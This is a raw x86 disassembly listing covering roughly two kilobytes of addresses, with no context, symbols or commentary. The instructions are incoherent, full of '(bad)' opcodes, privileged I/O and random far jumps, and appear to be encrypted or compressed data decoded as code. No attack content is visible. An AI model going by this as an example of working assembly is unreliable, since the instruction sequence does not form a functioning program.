  41f843:	inc    ebp
  41f844:	inc    ebp
  41f845:	sar    BYTE PTR [ebx],1
  41f847:	aaa    
  41f848:	add    eax,0x3641d182
  41f84d:	sbb    al,dl
  41f84f:	lock mov cl,0x89
  41f852:	add    eax,0x95e90882
  41f857:	and    eax,0x60c69e76
  41f85c:	add    eax,0x4c4dbd01
  41f861:	ja     0x41f88b
  41f863:	out    0xc6,eax
  41f865:	push   esi
  41f866:	js     0x41f8ae
  41f868:	pop    es
  41f869:	push   esi
  41f86a:	inc    dh
  41f86c:	cmp    ebx,ecx
  41f86e:	jns    0x41f837
  41f870:	jl     0x41f820
  41f872:	mov    ch,0x30
  41f874:	inc    edi
  41f875:	dec    edi
  41f876:	ds sub eax,0x3666d45
  41f87c:	and    al,0x11
  41f87e:	fcom   st(6)
  41f880:	arpl   WORD PTR [eax],si
  41f882:	cmc    
  41f883:	lds    ebx,FWORD PTR [edx-0x531abae7]
  41f889:	cli    
  41f88a:	clc    
  41f88b:	rcr    DWORD PTR [esi],0xdb
  41f88e:	pop    edx
  41f88f:	cld    
  41f890:	push   esp
  41f891:	add    al,0x32
  41f893:	stc    
  41f894:	jg     0x41f825
  41f896:	out    dx,al
  41f897:	pop    eax
  41f898:	mov    ebx,0x90ad138c
  41f89d:	xchg   esi,eax
  41f89e:	inc    esp
  41f89f:	imul   eax,ebx,0xffffff88
  41f8a2:	adc    DWORD PTR [edi+esi*8],esi
  41f8a5:	sbb    BYTE PTR gs:0x1a1704db,0x6
  41f8ad:	sbb    BYTE PTR [edx-0x55caa9da],dh
  41f8b3:	jne    0x41f8de
  41f8b5:	enter  0x5bc8,0xf0
  41f8b9:	cwde   
  41f8ba:	pop    ss
  41f8bb:	rcr    DWORD PTR [esi-0x529543fb],cl
  41f8c1:	jae    0x41f8ae
  41f8c3:	xchg   ecx,eax
  41f8c4:	out    0x99,eax
  41f8c6:	sub    edi,DWORD PTR [ebx+ebx*4+0x18bcfe91]
  41f8cd:	cmp    al,0x71
  41f8cf:	(bad)
  41f8d4:	mov    ebp,0x73ae062f
  41f8d9:	pop    ebx
  41f8da:	ds inc esp
  41f8dc:	jns    0x41f8a5
  41f8de:	inc    esp
  41f8df:	adc    edx,edx
  41f8e1:	sub    BYTE PTR [edx],ah
  41f8e3:	push   es
  41f8e4:	outs   dx,DWORD PTR ds:[esi]
  41f8e5:	scas   eax,DWORD PTR es:[edi]
  41f8e6:	inc    ebp
  41f8e7:	imul   ebp,esi,0xffffffbc
  41f8ea:	lahf   
  41f8eb:	inc    edi
  41f8ec:	jns    0x41f8f8
  41f8ee:	out    dx,eax
  41f8ef:	dec    ebx
  41f8f0:	bound  edi,QWORD PTR [edi+esi*4+0x4831cc60]
  41f8f7:	pop    esi
  41f8f8:	xchg   edi,eax
  41f8f9:	push   esp
  41f8fa:	out    dx,eax
  41f8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8fc:	sub    eax,0xe0142512
  41f901:	mov    ch,0xba
  41f903:	mov    WORD PTR [ecx+ebx*4],es
  41f906:	bound  eax,QWORD PTR [eax*4-0x1bde497e]
  41f90d:	push   cs
  41f90e:	ficomp DWORD PTR [esp+ebx*1]
  41f911:	sar    DWORD PTR [edi],cl
  41f913:	sub    eax,0x1620e1f2
  41f918:	xor    ebp,ecx
  41f91a:	out    dx,eax
  41f91b:	xor    al,0x36
  41f91d:	test   al,0x55
  41f91f:	mov    bl,0xcb
  41f921:	pop    esi
  41f922:	pop    ebp
  41f923:	fmul   DWORD PTR [edi+0x16]
  41f926:	sbb    edi,edx
  41f928:	outs   dx,BYTE PTR ds:[esi]
  41f929:	lea    esp,[esi+0x1b]
  41f92c:	pop    ebx
  41f92d:	xchg   esp,eax
  41f92e:	pop    ebp
  41f92f:	shl    DWORD PTR [ebp+ecx*2-0x2b],cl
  41f933:	mov    esi,0x9e41f65c
  41f938:	sub    eax,0xe78d5330
  41f93d:	lock or edi,edx
  41f940:	push   ecx
  41f941:	popf   
  41f942:	jecxz  0x41f989
  41f944:	stos   DWORD PTR es:[edi],eax
  41f945:	jbe    0x41f954
  41f947:	(bad)  
  41f948:	fild   DWORD PTR [ebx+0x77]
  41f94b:	shl    BYTE PTR [edx+0x4a1114ef],0xdd
  41f952:	iret   
  41f953:	jmp    0xbe9bc5b5
  41f958:	adc    ah,BYTE PTR [eax+0x74abfa64]
  41f95e:	mov    esi,0x2c8c7384
  41f963:	fdiv   QWORD PTR [esi-0x5e]
  41f966:	inc    ecx
  41f967:	and    cl,BYTE PTR [ebx]
  41f969:	xchg   esp,eax
  41f96a:	aas    
  41f96b:	jmp    0x41f963
  41f96d:	shr    bh,cl
  41f96f:	les    edx,FWORD PTR [ebx]
  41f971:	or     eax,0xe76c1d0c
  41f976:	rcr    cl,1
  41f978:	xor    al,0xf9
  41f97a:	mov    bl,0xf1
  41f97c:	sbb    BYTE PTR ds:0x258ce65e,0x95
  41f983:	jl     0x41f9fd
  41f985:	jmp    0xd45b:0x82f3e7b7
  41f98c:	add    eax,ebp
  41f98e:	in     eax,dx
  41f98f:	inc    ebx
  41f990:	push   ebp
  41f991:	adc    eax,0x1ee16d12
  41f996:	mov    ch,0xbd
  41f998:	in     eax,dx
  41f999:	pop    ds
  41f99a:	cwde   
  41f99b:	repz jnp 0x41f9fd
  41f99e:	jmp    0x880ba7f0
  41f9a3:	xor    DWORD PTR [ebx-0x49f7ea07],edx
  41f9a9:	push   0x43177649
  41f9ae:	fsub   DWORD PTR [edi-0x17]
  41f9b1:	sub    dl,cl
  41f9b3:	add    al,0xae
  41f9b5:	xchg   ecx,eax
  41f9b6:	js     0x41f9c6
  41f9b8:	cwde   
  41f9b9:	inc    eax
  41f9ba:	pop    ds
  41f9bb:	add    al,0x44
  41f9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9be:	cmp    ch,ch
  41f9c0:	fld    TBYTE PTR [edx-0x1db53682]
  41f9c6:	lods   al,BYTE PTR ds:[esi]
  41f9c7:	mov    ebx,0x635c7f6e
  41f9cc:	jge    0x41f954
  41f9ce:	aas    
  41f9cf:	and    bl,BYTE PTR [ebx+0x55]
  41f9d2:	adc    ecx,DWORD PTR [edx]
  41f9d4:	mov    esi,DWORD PTR [ecx]
  41f9d6:	mov    cl,0x6a
  41f9d8:	pushf  
  41f9d9:	cmp    esp,eax
  41f9db:	push   edi
  41f9dc:	out    dx,al
  41f9dd:	inc    edx
  41f9de:	pop    ebp
  41f9df:	(bad)  
  41f9e1:	sbb    dh,BYTE PTR [eax+0x3d4630a1]
  41f9e7:	push   ebp
  41f9e8:	jo     0x41f9f0
  41f9ea:	mov    ecx,0xa3ed9b51
  41f9ef:	push   0x76a334dc
  41f9f4:	in     eax,0x50
  41f9f6:	pop    edi
  41f9f7:	dec    ecx
  41f9f8:	ss cmp eax,0xaa04b62b
  41f9fe:	addr16 aas 
  41fa00:	mov    dh,0xb
  41fa02:	sub    esp,edx
  41fa04:	push   ebx
  41fa05:	popw   es
  41fa07:	clc    
  41fa08:	add    BYTE PTR [ecx-0x2b],dl
  41fa0b:	cmp    esi,DWORD PTR [ecx]
  41fa0d:	adc    BYTE PTR [edx-0x75d92683],cl
  41fa13:	repnz ins DWORD PTR es:[edi],dx
  41fa15:	pusha  
  41fa16:	sub    DWORD PTR [edx-0x58d8f9cc],ebx
  41fa1c:	dec    eax
  41fa1d:	lds    ecx,FWORD PTR [ebx+0x184b9ae7]
  41fa23:	shl    ch,cl
  41fa25:	push   esi
  41fa26:	xchg   ecx,eax
  41fa27:	dec    ebx
  41fa28:	repz mov ds:0xc4c3c68b,al
  41fa2e:	stc    
  41fa2f:	aas    
  41fa30:	sar    BYTE PTR [eax-0x61],1
  41fa33:	cli    
  41fa34:	mov    ebp,0x25c64dd4
  41fa39:	iret   
  41fa3a:	cld    
  41fa3b:	jns    0x41fab2
  41fa3d:	fcmovnbe st,st(2)
  41fa3f:	daa    
  41fa40:	xchg   edx,eax
  41fa41:	or     al,0x6d
  41fa43:	dec    edx
  41fa44:	mov    eax,ds:0x63f7afe6
  41fa49:	or     al,0x4c
  41fa4b:	inc    ebp
  41fa4c:	xchg   esi,eax
  41fa4d:	(bad)  
  41fa4e:	jp     0x41fa5b
  41fa50:	lock repz cmp edx,eax
  41fa54:	sti    
  41fa55:	into   
  41fa56:	inc    ecx
  41fa57:	mov    ebx,0x85d9a0c5
  41fa5c:	cmp    DWORD PTR [edi],edi
  41fa5e:	adc    bl,BYTE PTR [ebp+0x7d]
  41fa61:	sar    BYTE PTR [esi+0x17],1
  41fa64:	repnz dec ecx
  41fa66:	mov    ecx,esp
  41fa68:	in     eax,0x95
  41fa6a:	dec    edi
  41fa6b:	test   DWORD PTR [edx-0xd],ecx
  41fa6e:	dec    eax
  41fa6f:	adc    bl,BYTE PTR [esi-0x6e]
  41fa72:	mov    esp,0xa562582f
  41fa77:	int3   
  41fa78:	cmc    
  41fa79:	bound  edx,QWORD PTR [ebx-0x100f9e51]
  41fa7f:	popf   
  41fa80:	(bad)  
  41fa81:	nop
  41fa82:	mov    edx,0x3d1394b5
  41fa87:	mov    DWORD PTR [esi],esp
  41fa89:	jg     0x41fafe
  41fa8b:	rcl    DWORD PTR [ebx+esi*1-0x6443b583],0xf7
  41fa93:	jmp    0x41fb09
  41fa95:	mov    esp,0x9cc1638d
  41fa9a:	scas   eax,DWORD PTR es:[edi]
  41fa9b:	push   es
  41fa9c:	inc    edx
  41fa9d:	je     0x41faf6
  41fa9f:	lods   al,BYTE PTR ds:[esi]
  41faa0:	mov    ebx,0x1b71c81b
  41faa5:	push   eax
  41faa6:	inc    esp
  41faa7:	dec    esi
  41faa8:	mov    al,ds:0xc1dee90e
  41faad:	fadd   st,st(4)
  41faaf:	lods   eax,DWORD PTR ds:[esi]
  41fab0:	mov    edi,0x427cb576
  41fab5:	ins    DWORD PTR es:[edi],dx
  41fab6:	aas    
  41fab7:	jl     0x41fa7d
  41fab9:	out    dx,eax
  41faba:	loop   0x41fac6
  41fabc:	fwait
  41fabd:	lds    ecx,FWORD PTR [edx]
  41fabf:	outs   dx,BYTE PTR ds:[esi]
  41fac0:	and    al,BYTE PTR [ebx+0x1f]
  41fac3:	rcl    BYTE PTR [eax+0x31],cl
  41fac6:	and    al,0xdf
  41fac8:	inc    DWORD PTR [edx]
  41faca:	and    eax,0xb8838b78
  41facf:	mov    bh,0x55
  41fad1:	mov    edi,ss
  41fad3:	loope  0x41fad6
  41fad5:	mov    dl,0x2a
  41fad7:	xchg   edx,eax
  41fad8:	shl    BYTE PTR [edi-0x66],cl
  41fadb:	dec    ebx
  41fadc:	jmp    0xc45:0x9c0b0d1e
  41fae3:	or     al,ah
  41fae5:	shr    BYTE PTR [edx+ebp*1],0x1
  41fae9:	retf   0x22a8
  41faec:	xor    DWORD PTR [ebp+0x50],edx
  41faef:	les    ecx,FWORD PTR [ebp-0x70]
  41faf2:	and    edi,DWORD PTR [ecx]
  41faf4:	aaa    
  41faf5:	pop    esi
  41faf6:	scas   al,BYTE PTR es:[edi]
  41faf7:	push   0xaf6fa2f2
  41fafc:	fld    TBYTE PTR [eax-0x16]
  41faff:	mov    cl,BYTE PTR [ecx+0x69]
  41fb02:	fs addr16 push edx
  41fb05:	shl    edx,cl
  41fb07:	and    BYTE PTR [eax-0x3a],al
  41fb0a:	xor    ah,BYTE PTR [ebx+0x3c341f52]
  41fb10:	jnp    0x41fab3
  41fb12:	not    DWORD PTR [edx-0x74561824]
  41fb18:	cld    
  41fb19:	js     0x41fae7
  41fb1b:	jne    0x41fb71
  41fb1d:	fmulp  st(3),st
  41fb1f:	out    dx,al
  41fb20:	cld    
  41fb21:	int3   
  41fb22:	jnp    0x41fb41
  41fb24:	push   0x3483cb02
  41fb29:	shl    edi,1
  41fb2b:	mov    al,ds:0x195a8d9c
  41fb30:	fild   WORD PTR [bp+si-0x21]
  41fb34:	mov    BYTE PTR [ecx-0x1809ff82],ch
  41fb3a:	ins    BYTE PTR es:[edi],dx
  41fb3b:	xchg   ebx,eax
  41fb3c:	shufps xmm7,XMMWORD PTR [ebp-0x5d],0x16
  41fb41:	push   edx
  41fb42:	fwait
  41fb43:	push   ds
  41fb44:	es pop esi
  41fb46:	adc    DWORD PTR [esi],ebp
  41fb48:	jmp    0x7f39:0xc7abd73d
  41fb4f:	xor    BYTE PTR [eax-0x42c67852],bh
  41fb55:	xchg   edx,eax
  41fb56:	fs stc 
  41fb58:	je     0x41fb08
  41fb5a:	xchg   ebp,eax
  41fb5b:	add    DWORD PTR [edx+0x79e3ff54],esi
  41fb61:	dec    esp
  41fb62:	imul   esi,edi,0x44
  41fb65:	ss dec edi
  41fb67:	mov    ecx,0xb12aaf6c
  41fb6c:	dec    ebx
  41fb6d:	jecxz  0x41fb0b
  41fb6f:	jnp    0x41fb8f
  41fb71:	aam    0x67
  41fb73:	add    eax,0x36d8161b
  41fb78:	(bad)
  41fb7b:	retf   
  41fb7c:	repnz stos BYTE PTR es:[edi],al
  41fb7e:	add    al,0xc6
  41fb80:	aas    
  41fb81:	sahf   
  41fb82:	fld    QWORD PTR [eax]
  41fb84:	inc    esp
  41fb85:	pop    ebx
  41fb86:	aam    0x39
  41fb88:	inc    ebx
  41fb89:	xor    eax,0x38450d25
  41fb8e:	inc    ebp
  41fb8f:	cmp    ebx,DWORD PTR [ecx+0x3b0b4047]
  41fb95:	and    DWORD PTR [ecx+0xe],esp
  41fb98:	test   esp,edi
  41fb9a:	call   eax
  41fb9c:	cmp    BYTE PTR [edx-0x328926e7],bl
  41fba2:	ins    BYTE PTR es:[edi],dx
  41fba3:	push   0x5a
  41fba5:	jmp    0xb931a055
  41fbaa:	jns    0x41fbdc
  41fbac:	or     esp,DWORD PTR ss:[esi-0x5e]
  41fbb0:	sbb    BYTE PTR [edi*8+0x7a900852],ch
  41fbb7:	loope  0x41fb5a
  41fbb9:	push   ebx
  41fbba:	test   al,0x57
  41fbbc:	je     0x41fbe5
  41fbbe:	ret    
  41fbbf:	shl    DWORD PTR [eax],0x97
  41fbc2:	cmp    eax,0x35078e0e
  41fbc7:	adc    al,BYTE PTR [ebx]
  41fbc9:	shl    BYTE PTR [edx],1
  41fbcb:	imul   edi,DWORD PTR [ebx-0x31],0xb0dd41d0
  41fbd2:	mov    edx,0x859f135d
  41fbd7:	xchg   edx,eax
  41fbd8:	mov    ch,0xd7
  41fbda:	sub    dh,BYTE PTR [edx+0x33]
  41fbdd:	imul   esp,DWORD PTR [esi],0x34
  41fbe0:	add    al,0xcd
  41fbe2:	xor    DWORD PTR [ebx],ecx
  41fbe4:	pop    edx
  41fbe5:	mov    ecx,0x9b6ef398
  41fbea:	add    eax,0xc8f8dc3b
  41fbef:	and    DWORD PTR [edi+0x156843a9],edx
  41fbf5:	add    eax,0xde53180b
  41fbfa:	inc    ebp
  41fbfb:	jl     0x41fbb5
  41fbfd:	xor    al,0xf9
  41fbff:	fnstcw WORD PTR [edi+0x72]
  41fc02:	dec    ebx
  41fc03:	nop
  41fc04:	jo     0x41fc7e
  41fc06:	pxor   mm3,mm3
  41fc09:	(bad)  
  41fc0a:	es cld 
  41fc0c:	push   ds
  41fc0d:	or     al,0x88
  41fc0f:	leave  
  41fc10:	stos   DWORD PTR es:[edi],eax
  41fc11:	pop    edx
  41fc12:	jno    0x41fc20
  41fc14:	cmp    dh,0x7a
  41fc17:	aas    
  41fc18:	jg     0x41fc0b
  41fc1a:	mov    bh,0x65
  41fc1c:	ficomp WORD PTR [edi+edx*4-0x50ef11ba]
  41fc23:	lock imul edx,ebx,0xffffffe6
  41fc27:	jg     0x41fc38
  41fc29:	call   FWORD PTR [eax]
  41fc2b:	lock jmp 0x4be6:0x71e70b2c
  41fc33:	xchg   edi,eax
  41fc34:	shl    BYTE PTR ds:0x3f6e35d,cl
  41fc3a:	fwait
  41fc3b:	popf   
  41fc3c:	out    0x85,al
  41fc3e:	inc    esi
  41fc3f:	repnz popf 
  41fc41:	(bad)  
  41fc43:	lock popa 
  41fc45:	add    al,ah
  41fc47:	or     cl,BYTE PTR [ebp-0x1f]
  41fc4a:	(bad)
  41fc4e:	and    BYTE PTR [esi+0x6],ch
  41fc51:	daa    
  41fc52:	loopne 0x41fbff
  41fc54:	jne    0x41fbe0
  41fc56:	push   es
  41fc57:	pop    ss
  41fc58:	adc    ebx,edi
  41fc5a:	dec    ebp
  41fc5b:	and    bl,BYTE PTR [edi+0x1f54efed]
  41fc61:	xor    bh,BYTE PTR [eax]
  41fc63:	shl    BYTE PTR [ebp+0x67],cl
  41fc66:	loopne 0x41fc3a
  41fc68:	push   ss
  41fc69:	repnz (bad) 
  41fc6b:	cmp    al,0x50
  41fc6d:	mov    es,esp
  41fc6f:	or     BYTE PTR [esi],ah
  41fc71:	imul   ebx,DWORD PTR [eax],0xffffffb5
  41fc74:	mov    dh,0x18
  41fc76:	jmp    0x3d2f:0x75e4c6fd
  41fc7d:	mov    gs,esp
  41fc7f:	inc    esp
  41fc80:	stc    
  41fc81:	mov    ds:0xc3296d3e,eax
  41fc86:	mov    ah,0x52
  41fc88:	iret   
  41fc89:	adc    eax,0x300e1606
  41fc8e:	les    ebp,FWORD PTR [ebx+0x297d02af]
  41fc94:	pop    esp
  41fc95:	add    cl,cl
  41fc97:	xor    al,0x84
  41fc99:	adc    esp,ecx
  41fc9b:	pop    eax
  41fc9c:	mov    ah,0x7b
  41fc9e:	push   eax
  41fc9f:	lods   al,BYTE PTR ds:[esi]
  41fca0:	jle    0x41fc69
  41fca2:	outs   dx,BYTE PTR ds:[esi]
  41fca3:	push   DWORD PTR [edi-0x24]
  41fca6:	mov    eax,ds:0x11a6bea1
  41fcab:	loope  0x41fcca
  41fcad:	jno    0x41fc31
  41fcaf:	jbe    0x41fcf4
  41fcb1:	ds push eax
  41fcb3:	jnp    0x41fcfa
  41fcb5:	jnp    0x41fd12
  41fcb7:	setp   BYTE PTR ds:0x14572a8e
  41fcbe:	and    al,0xb0
  41fcc0:	xor    ebx,DWORD PTR [esi+0x36]
  41fcc3:	and    bh,BYTE PTR [ecx-0x51]
  41fcc6:	idiv   DWORD PTR [ebp-0xb]
  41fcc9:	arpl   WORD PTR [ebp-0x30f65d92],bx
  41fccf:	lahf   
  41fcd0:	cmp    DWORD PTR [ecx+0x6e6e1b0],0xffffffdd
  41fcd7:	xor    eax,0xb8666a1c
  41fcdc:	pop    eax
  41fcdd:	jle    0x41fd4b
  41fcdf:	ret    0x48a9
  41fce2:	sbb    eax,ecx
  41fce4:	mov    cl,0xf7
  41fce6:	push   cs
  41fce7:	enter  0xf0ac,0x1d
  41fceb:	ins    DWORD PTR es:[edi],dx
  41fcec:	(bad)  
  41fced:	mov    ds:0x92c0c481,al
  41fcf2:	lock xlat BYTE PTR ds:[ebx]
  41fcf4:	inc    eax
  41fcf5:	adc    ecx,DWORD PTR [esi]
  41fcf7:	mov    ebp,0x41fb029d
  41fcfc:	cli    
  41fcfd:	xor    ecx,DWORD PTR [eax]
  41fcff:	mov    eax,0xe1d77cea
  41fd05:	cmp    eax,0x4be8dc14
  41fd0a:	lods   al,BYTE PTR ds:[esi]
  41fd0b:	and    eax,0x17e0ac5e
  41fd10:	les    edx,FWORD PTR [eax+0xccbaa4f]
  41fd16:	or     DWORD PTR [edx-0x23],esi
  41fd19:	fwait
  41fd1a:	and    dl,BYTE PTR [ebp-0x33fb3c95]
  41fd20:	push   es
  41fd21:	jp     0x41fd45
  41fd23:	fimul  DWORD PTR [ecx+0x3ed93c4e]
  41fd29:	jb     0x41fd71
  41fd2b:	ins    DWORD PTR es:[edi],dx
  41fd2c:	inc    esp
  41fd2d:	xchg   DWORD PTR [ebp-0x4c9e9019],eax
  41fd33:	or     edi,edx
  41fd35:	push   es
  41fd36:	sub    al,0x6
  41fd38:	jl     0x41fcce
  41fd3a:	push   0x84dfd0ca
  41fd3f:	repz inc eax
  41fd41:	mov    ch,BYTE PTR ds:0xa4c2a5cb
  41fd47:	mov    ds:0xf209d393,eax
  41fd4c:	loope  0x41fcea
  41fd4e:	mov    ah,0xb7
  41fd50:	sub    al,0xc
  41fd52:	gs iret 
  41fd54:	mov    al,0x3
  41fd56:	ficom  DWORD PTR [ebx-0x5d]
  41fd59:	cmp    DWORD PTR [esi-0x6b],0x1c
  41fd5d:	rol    DWORD PTR [ebx],cl
  41fd5f:	jecxz  0x41fda2
  41fd61:	dec    eax
  41fd62:	cdq    
  41fd63:	sahf   
  41fd64:	call   0xb771d2f5
  41fd69:	mov    edx,0x47af4adf
  41fd6e:	adc    BYTE PTR [ebx+ecx*4],ch
  41fd71:	sub    DWORD PTR [ebx],esi
  41fd73:	mov    DWORD PTR [eax],0x3664a8a3
  41fd79:	sbb    al,0x46
  41fd7b:	mov    ds:0x7a9c21f0,eax
  41fd80:	inc    ebp
  41fd81:	jb     0x41fe00
  41fd83:	imul   eax,eax,0x2c69a672
  41fd89:	mov    dl,0x7
  41fd8c:	fs jbe 0x41fdde
  41fd8f:	stc    
  41fd90:	mov    ebp,DWORD PTR [esi-0x7b]
  41fd93:	stc    
  41fd94:	adc    DWORD PTR [edx+eiz*8],ebx
  41fd97:	stc    
  41fd98:	cld    
  41fd99:	push   0xe4f3373f
  41fd9e:	xor    ah,ah
  41fda0:	pusha  
  41fda1:	dec    esi
  41fda2:	js     0x41fd45
  41fda4:	pop    ss
  41fda5:	(bad)
  41fda9:	ss pusha 
  41fdab:	and    al,0x79
  41fdad:	jb     0x41fe06
  41fdaf:	push   edi
  41fdb0:	pop    ebx
  41fdb1:	mov    DWORD PTR [edx-0x2e2e88e2],ebx
  41fdb7:	fisub  WORD PTR [eax-0x2a5e533e]
  41fdbd:	dec    edx
  41fdbe:	inc    bh
  41fdc0:	test   al,0xfe
  41fdc2:	inc    eax
  41fdc3:	nop
  41fdc4:	push   esp
  41fdc5:	fldcw  WORD PTR [esi-0x3]
  41fdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc9:	out    dx,eax
  41fdca:	dec    edi
  41fdcb:	sbb    edi,DWORD PTR [eax-0x37]
  41fdce:	adc    ebp,DWORD PTR [eax-0x1dbfdae8]
  41fdd4:	xlat   BYTE PTR ds:[ebx]
  41fdd5:	repz inc ecx
  41fdd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd8:	in     al,dx
  41fdd9:	dec    eax
  41fdda:	std    
  41fddb:	jnp    0x41fe2c
  41fddd:	ss cmc 
  41fddf:	les    ebp,FWORD PTR [ebp+0x6b]
  41fde2:	mov    bl,0xa4
  41fde4:	sahf   
  41fde5:	jae    0x41fdc8
  41fde7:	(bad)  
  41fde8:	aam    0x34
  41fdea:	sar    DWORD PTR [edx+eax*2],1
  41fded:	mov    eax,ds:0xc4f4a138
  41fdf2:	add    ebx,edx
  41fdf4:	loopne 0x41fde4
  41fdf6:	dec    ecx
  41fdf7:	cmc    
  41fdf8:	xor    cl,BYTE PTR [ebp+0x67]
  41fdfb:	jno    0x41fe55
  41fdfd:	add    al,0x48
  41fdff:	lods   eax,DWORD PTR ds:[esi]
  41fe00:	xchg   ebx,edi
  41fe02:	pop    eax
  41fe03:	dec    esp
  41fe04:	ret    0xe83e
  41fe07:	mov    esi,0x854ed6e4
  41fe0c:	cmp    al,ch
  41fe0e:	xor    al,BYTE PTR [ebx-0x57]
  41fe11:	rcl    DWORD PTR [edi-0x20dd1617],0xd3
  41fe18:	lods   eax,DWORD PTR ds:[esi]
  41fe19:	imul   ecx,DWORD PTR [eax+0x4c0f734e],0xffffffed
  41fe20:	idiv   ebx
  41fe22:	push   edi
  41fe23:	cld    
  41fe24:	dec    esp
  41fe25:	gs pusha 
  41fe27:	test   al,0x99
  41fe29:	sub    esi,DWORD PTR [ebx+0x6ff0c23]
  41fe2f:	sti    
  41fe30:	bound  ebp,QWORD PTR [edi-0x1a4e01f5]
  41fe36:	lds    edi,FWORD PTR ds:0xa5719ee8
  41fe3c:	mov    bh,BYTE PTR [edx+0x453f34a8]
  41fe42:	rep outs dx,BYTE PTR ds:[esi]
  41fe45:	cs loopne 0x41fdeb
  41fe48:	aaa    
  41fe49:	jb     0x41fdeb
  41fe4b:	outs   dx,BYTE PTR ds:[esi]
  41fe4c:	add    DWORD PTR [ebp+0x227516ad],edi
  41fe52:	sbb    al,0xe3
  41fe54:	or     bl,BYTE PTR [esi-0x685205db]
  41fe5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe5b:	scas   eax,DWORD PTR es:[edi]
  41fe5c:	inc    ebp
  41fe5d:	ins    BYTE PTR es:[edi],dx
  41fe5e:	mov    cs,ecx
  41fe60:	sub    esi,ebp
  41fe62:	mov    ecx,0x9e4987fd
  41fe67:	loop   0x41fe50
  41fe69:	in     eax,dx
  41fe6a:	shl    DWORD PTR [ebx-0x34],1
  41fe6d:	into   
  41fe6e:	ror    BYTE PTR [eax+eiz*2-0x41cae78],cl
  41fe75:	or     ah,0x38
  41fe78:	lahf   
  41fe79:	xchg   DWORD PTR ds:[edx+0x4d93efec],ebp
  41fe80:	cs pop esp
  41fe82:	inc    edi
  41fe83:	aaa    
  41fe84:	aam    0xf5
  41fe86:	loop   0x41fec8
  41fe88:	adc    dl,BYTE PTR [edi-0x583a79f2]
  41fe8e:	rsm    
  41fe90:	xor    al,0xc2
  41fe92:	or     eax,0x84fee6d2
  41fe97:	or     al,0x11
  41fe99:	pop    ebx
  41fe9a:	sbb    BYTE PTR ss:[ebx],dh
  41fe9d:	mov    bl,BYTE PTR [ecx+0x5a43a87a]
  41fea3:	cmp    eax,0xaac792d9
  41fea8:	and    DWORD PTR [edx+0x0],esi
  41feab:	cld    
  41feac:	icebp  
  41fead:	add    cl,BYTE PTR [edi+ebp*2-0x5c715bb8]
  41feb4:	sub    dh,cl
  41feb6:	cmp    dh,bh
  41feb8:	fsubr  st(1),st
  41feba:	xchg   bl,bl
  41febc:	cmp    edi,DWORD PTR [ebx]
  41febe:	ins    BYTE PTR es:[edi],dx
  41febf:	pop    esi
  41fec0:	add    dh,BYTE PTR [edi]
  41fec2:	scas   eax,DWORD PTR es:[edi]
  41fec3:	dec    edi
  41fec4:	cld    
  41fec5:	(bad)
  41fec9:	stos   DWORD PTR es:[edi],eax
  41feca:	fdivr  DWORD PTR [ebx]
  41fecc:	fiadd  WORD PTR [edi]
  41fece:	iret   
  41fecf:	xchg   esi,eax
  41fed0:	ja     0x41feac
  41fed2:	mov    ecx,0x174b722d
  41fed7:	pop    edi
  41fed9:	repnz in ax,0x54
  41fedd:	mov    bh,0xa5
  41fedf:	jmp    0x9e2248f6
  41fee4:	cwde   
  41fee5:	pop    ds
  41fee6:	stc    
  41fee7:	jle    0x41ff49
  41fee9:	shr    DWORD PTR [edx-0x274764ff],1
  41feef:	jge    0x41ff52
  41fef1:	shl    BYTE PTR [edx],cl
  41fef3:	mov    ecx,0x559299d0
  41fef8:	out    0x85,eax
  41fefa:	ficom  WORD PTR [edx-0x65e87011]
  41ff00:	stos   BYTE PTR es:[edi],al
  41ff01:	repz js 0x41feed
  41ff04:	ret    
  41ff05:	or     DWORD PTR [edx-0x42b822f9],ebx
  41ff0b:	add    BYTE PTR [ebx+0x34b9c290],dl
  41ff11:	pop    ebp
  41ff12:	sub    cl,BYTE PTR [ecx]
  41ff14:	pop    edx
  41ff15:	jnp    0x41ff3c
  41ff17:	pop    ss
  41ff18:	or     cl,BYTE PTR [edi+ecx*2-0x74]
  41ff1c:	int3   
  41ff1d:	loopne 0x41feb7
  41ff1f:	mov    dl,0x30
  41ff21:	cmp    eax,ebx
  41ff23:	xor    al,0x47
  41ff25:	jge    0x41ff2d
  41ff27:	mov    ds:0xf4453c0,eax
  41ff2d:	clc    
  41ff2e:	cmp    ebx,ebp
  41ff30:	jecxz  0x41fef0
  41ff32:	out    dx,eax
  41ff33:	push   ebx
  41ff34:	in     al,0xcb
  41ff36:	pop    ebx
  41ff37:	call   0x68e8a7d4
  41ff3c:	dec    ebp
  41ff3d:	pop    ebx
  41ff3e:	mov    ch,0x12
  41ff40:	test   eax,0x6a3e2c17
  41ff45:	repz add al,0xe
  41ff48:	push   ecx
  41ff49:	fdiv   st(0),st
  41ff4b:	push   esi
  41ff4c:	jb     0x41ff7d
  41ff4e:	int3   
  41ff4f:	xchg   esi,eax
  41ff50:	sub    ch,dl
  41ff52:	aam    0xd4
  41ff54:	mov    dl,0x5c
  41ff56:	xchg   esi,eax
  41ff57:	xchg   esi,eax
  41ff58:	dec    edx
  41ff59:	inc    ecx
  41ff5a:	push   ebx
  41ff5b:	xor    ebp,DWORD PTR ds:0x56612c89
  41ff61:	push   0xffffffe0
  41ff63:	pop    edi
  41ff64:	test   dx,sp
  41ff67:	lock jg 0x41ff03
  41ff6a:	inc    esi
  41ff6b:	pop    ds
  41ff6c:	ins    DWORD PTR es:[edi],dx
  41ff6d:	inc    esi
  41ff6e:	shr    BYTE PTR [edx+0x221a27b1],cl
  41ff74:	inc    BYTE PTR [ecx-0x24cf6f07]
  41ff7a:	cwde   
  41ff7b:	jmp    0x41ffbb
  41ff7d:	inc    esi
  41ff7e:	mov    ah,0xc3
  41ff80:	das    
  41ff81:	mov    eax,ds:0x73dfe664
  41ff86:	scas   al,BYTE PTR es:[edi]
  41ff87:	(bad)  
  41ff88:	cdq    
  41ff89:	jo     0x41ff9e
  41ff8b:	jns    0x41ff39
  41ff8d:	shl    BYTE PTR [eax+0x35],cl
  41ff90:	mov    esp,0xe1e2c06c
  41ff95:	mov    ds:0x6d3d5465,al
  41ff9a:	inc    eax
  41ff9b:	test   eax,0xbe5c5c23
  41ffa0:	push   ebp
  41ffa1:	dec    ecx
  41ffa2:	or     DWORD PTR [edx-0x818e135],ebp
